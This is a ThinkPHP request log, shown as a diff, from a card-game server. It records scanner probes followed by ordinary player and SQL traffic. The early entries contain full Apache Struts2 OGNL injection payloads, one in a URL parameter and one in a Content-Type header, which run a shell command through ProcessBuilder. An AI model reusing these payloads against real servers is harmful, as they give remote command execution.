+[ info ] card.dcwen.top/?k=%27%2B%28%23context%5B%5C%22xwork.MethodAccessor.denyMethodExecution%5C%22%5D=new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%5C%22allowStaticMethodAccess%5C%22%5D=new%20java.lang.Boolean%28true%29%2C%23_memberAccess.excludeProperties=%7B%7D%2C%23a_str=%27814F60BD-F6DF-4227-%27%2C%23b_str=%2786F5-8D9FBF26A2EB%27%2C%23a_resp=%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23a_resp.getWriter%28%29.println%28%23a_str%2B%23b_str%29%2C%23a_resp.getWriter%28%29.flush%28%29%2C%23a_resp.getWriter%28%29.close%28%29%29%2B%27 [运行时间：0.002983s][吞吐率：335.25req/s] [内存消耗：553.19kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-overwrite-referer' => '',
+  'miner-worker' => 'struts_cmd',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+  'content-type' => '%{(#saolei=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'echo c6a2fa5f-142e-4278-8aa6-3047a677d699\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
+)
+[ info ] [ PARAM ] array (
+  'k' => '\'+(#context[\\"xwork.MethodAccessor.denyMethodExecution\\"]=new java.lang.Boolean(false),#_memberAccess[\\"allowStaticMethodAccess\\"]=new java.lang.Boolean(true),#_memberAccess.excludeProperties={},#a_str=\'814F60BD-F6DF-4227-\',#b_str=\'86F5-8D9FBF26A2EB\',#a_resp=@org.apache.struts2.ServletActionContext@getResponse(),#a_resp.getWriter().println(#a_str+#b_str),#a_resp.getWriter().flush(),#a_resp.getWriter().close())+\'',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:43+08:00 ] 172.16.0.5 180.97.106.163 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003532s][吞吐率：283.13req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'file_inc',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:47+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003557s][吞吐率：281.14req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'file_inc',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:47+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.002477s][吞吐率：403.73req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'file_inc',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:47+08:00 ] 172.16.0.5 180.97.106.163 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.002633s][吞吐率：379.78req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'file_inc',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:51+08:00 ] 172.16.0.5 180.97.106.163 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003208s][吞吐率：311.73req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'file_inc',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:53+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003292s][吞吐率：303.76req/s] [内存消耗：546.55kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'referer' => '',
+  'miner-worker' => 'fastcgi',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:53+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003109s][吞吐率：321.65req/s] [内存消耗：546.55kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'referer' => '',
+  'miner-worker' => 'fastcgi',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:53+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003243s][吞吐率：308.36req/s] [内存消耗：546.55kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'referer' => '',
+  'miner-worker' => 'fastcgi',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:13:00+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003050s][吞吐率：327.88req/s] [内存消耗：546.54kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'referer' => '',
+  'miner-worker' => 'fastcgi',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:13:00+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.002757s][吞吐率：362.70req/s] [内存消耗：546.55kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'referer' => '',
+  'miner-worker' => 'fastcgi',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:13:01+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top/ [运行时间：0.003140s][吞吐率：318.47req/s] [内存消耗：546.52kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'referer' => '',
+  'miner-worker' => 'fastcgi',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:13:01+08:00 ] 172.16.0.5 180.97.106.163 GET /admin/login/show_login.html
+[ info ] card.dcwen.top/admin/login/show_login.html [运行时间：0.006971s][吞吐率：143.45req/s] [内存消耗：1,735.27kb] [文件加载：59]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'show_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'referer' => '',
+  'miner-worker' => 'fastcgi',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+  '/admin/login/show_login_html' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->show_login[ /var/www/card/app/admin/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/card/app/admin/view/login/login_page.html [ array (
+) ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000209s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.000691s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000150s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000106s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_widgets` [ RunTime:0.000507s ]
+[ sql ] [ SQL ] SELECT `wid_params` FROM `edd_widgets` WHERE  `wid_key` = 'lsm_verify' LIMIT 1 [ RunTime:0.000239s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000121s ]
+---------------------------------------------------------------
+[ 2017-10-01T09:23:13+08:00 ] 172.16.0.5 112.195.146.84 POST /player_info
+[ info ] card.dcwen.top/player_info [运行时间：0.075412s][吞吐率：13.26req/s] [内存消耗：732.77kb] [文件加载：55]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Player/get_player_info',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0.2; vivo Y35 Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'card.dcwen.top',
+  'content-length' => '9',
+)
+[ info ] [ PARAM ] array (
+  '/player_info' => '',
+  'cid' => 'bjMJI',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Player->get_player_info[ /var/www/card/app/home/controller/Player.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001335s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.000734s ]
+[ sql ] [ SQL ] SELECT `is_close` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_player` [ RunTime:0.000524s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_player` WHERE  `player_id` = 16 LIMIT 1 [ RunTime:0.000125s ]
+---------------------------------------------------------------
+[ 2017-10-01T09:23:14+08:00 ] 172.16.0.5 112.195.146.84 POST /news_show
+[ info ] card.dcwen.top/news_show [运行时间：0.007635s][吞吐率：130.98req/s] [内存消耗：552.32kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Home/home_page',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0.2; vivo Y35 Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'host' => 'card.dcwen.top',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+  '/news_show' => '',
+)
+[ info ] [ RUN ] app\home\controller\Home->home_page[ /var/www/card/app/home/controller/Home.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T09:23:14+08:00 ] 172.16.0.5 112.195.146.84 POST /player_info
+[ info ] card.dcwen.top/player_info [运行时间：0.019289s][吞吐率：51.84req/s] [内存消耗：715.32kb] [文件加载：55]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Player/get_player_info',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0.2; vivo Y35 Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'card.dcwen.top',
+  'content-length' => '9',
+)
+[ info ] [ PARAM ] array (
+  '/player_info' => '',
+  'cid' => 'AJ-Ts',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Player->get_player_info[ /var/www/card/app/home/controller/Player.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003835s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.001611s ]
+[ sql ] [ SQL ] SELECT `is_close` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000151s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_player` [ RunTime:0.000506s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_player` WHERE  `player_id` = 16 LIMIT 1 [ RunTime:0.000390s ]
+---------------------------------------------------------------
+[ 2017-10-01T09:23:14+08:00 ] 172.16.0.5 112.195.146.84 POST /room_page
+[ info ] card.dcwen.top/room_page [运行时间：0.024095s][吞吐率：41.50req/s] [内存消耗：745.84kb] [文件加载：56]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'controller',
+  'controller' => 'home/Room/room_page',
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'charset' => 'UTF-8',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0.2; vivo Y35 Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'host' => 'card.dcwen.top',
+  'content-length' => '9',
+)
+[ info ] [ PARAM ] array (
+  '/room_page' => '',
+  'cid' => 'AJ-Ts',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Room->room_page[ /var/www/card/app/home/controller/Room.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004819s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.000514s ]
+[ sql ] [ SQL ] SELECT `is_close` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000130s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_room` [ RunTime:0.001211s ]
+[ sql ] [ SQL ] SELECT `room_id`,`round_times`,`room_code` FROM `edd_room` WHERE  `room_owner` = 16  AND `del_time` = '0' [ RunTime:0.000134s ]
+---------------------------------------------------------------
+[ 2017-10-01T09:23:14+08:00 ] 172.16.0.5 112.195.146.84 POST /connect
+[ info ] card.dcwen.top/connect [运行时间：0.013937s][吞吐率：71.75req/s] [内存消耗：736.52kb] [文件加载：56]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
